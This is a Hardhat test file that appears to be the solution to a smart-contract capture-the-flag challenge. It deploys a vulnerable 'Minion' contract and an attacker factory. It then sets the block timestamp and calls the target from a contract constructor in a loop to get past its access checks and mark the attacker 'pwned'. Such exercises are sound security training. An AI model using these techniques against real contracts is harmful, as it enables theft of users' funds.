import { time,loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

//1672900236%120
describe("Mock Access Control",  function () {

    async function deployState() {
        const [owner, attacker] = await ethers.getSigners();
        const Minion = await ethers.getContractFactory("Minion");
        const minion = await Minion.connect(owner).deploy();
            return { minion, attacker };
      }

    it("attackercontract Should be pwned", async function () {
        const { minion,attacker  } = await loadFixture(deployState);
        
        // deploying the attackerFactoryContract with 10 ethers
        const AttackerFactoryContract = await ethers.getContractFactory("AttackerFactoryContract");
        const attackerFactoryContract = await AttackerFactoryContract.connect(attacker).deploy(minion.address,ethers.BigNumber.from("190000000000000000"),{ value: ethers.utils.parseEther("10")});
        
        // Setting Block.timestamp to a future number which when moduloed by 120 gives a number in the range of 0 to 59, current example  1682900296 % 120 == 16
        await time.setNextBlockTimestamp(1682900296);
        
        // Launching the exploit via attackerContract which is deployed by attackerFactoryContract 
        // attackerContract contracts calls the minion pwn function in the constructor to passchecks and does this in loop for 6 times
        // during the last call contributions of attackerContract get above 1 ether making it pwned.
        const tx = await attackerFactoryContract.connect(attacker).Create_when_time();
        await tx.wait();

        // using the transaction hash and getting the return variable from it by decoding.
        const trace = await ethers.provider.send("debug_traceTransaction", [tx.hash])
        const [attackerContractAddress] = ethers.utils.defaultAbiCoder.decode(
         ['address'],
        `0x${trace.returnValue}`
         )
        //  console.log("-------> attackerContractAddress = ",attackerContractAddress)

        // finally checking whether attackerContract address is verified.
         expect( await minion.connect(attacker).verify(attackerContractAddress)).to.equal(true,"Attacker Contract is'nt pwned try again");

    })

})
